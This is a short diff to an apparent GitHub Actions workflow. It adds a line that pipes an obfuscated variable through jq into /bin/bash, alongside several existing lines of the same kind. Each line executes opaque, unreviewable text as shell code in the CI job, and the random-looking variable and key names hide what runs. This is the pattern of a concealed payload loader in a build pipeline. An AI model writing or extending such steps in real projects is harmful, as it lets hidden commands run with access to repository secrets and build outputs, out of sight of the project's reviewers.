@@ -47,6 +47,7 @@ jobs:
           echo $s4004 | jq -r .uj1076 | /bin/bash
           printf '%s' "$v6576" | jq -r .usns17885 | /bin/bash
           echo $ah9107 | jq -r .kqin071 | /bin/bash
+          printf '%s' "$rng6" | jq -r .cfm99 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
